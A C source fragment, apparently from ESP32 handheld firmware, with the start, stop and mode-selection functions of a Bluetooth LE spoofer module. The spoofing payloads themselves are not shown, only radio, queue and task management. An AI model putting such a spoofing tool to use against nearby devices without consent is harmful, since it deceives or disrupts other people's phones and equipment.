// ═══════════════════════════════════════════════════════════════════════════

void bleSpooferStart() {
    if (!radioAcquire(RADIO_BLE)) {
        #if CYD_DEBUG
        Serial.println("[BLESPOOF] ERROR: could not acquire radio");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(bleSpooferWorkerTask, "ble_spoof", 8192, NULL, 2,
                            &s_workerHandle, 0);
}

void bleSpooferStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

void bleSpooferAdjustMode(int delta) {
    int idx = s_currentMode;
    idx = (idx + delta + MODE_COUNT) % MODE_COUNT;
    s_currentMode = idx;
}

int bleSpooferModeCount() { return MODE_COUNT; }

const char* bleSpooferModeName(int index) {
    if (index < 0 || index >= MODE_COUNT) return "?";
    return MODE_NAMES[index];
}

int bleSpooferGetMode() { return s_currentMode; }

void bleSpooferSetMode(int index) {
    if (index < 0) index = 0;
    if (index >= MODE_COUNT) index = MODE_COUNT - 1;
    s_currentMode = index;
}
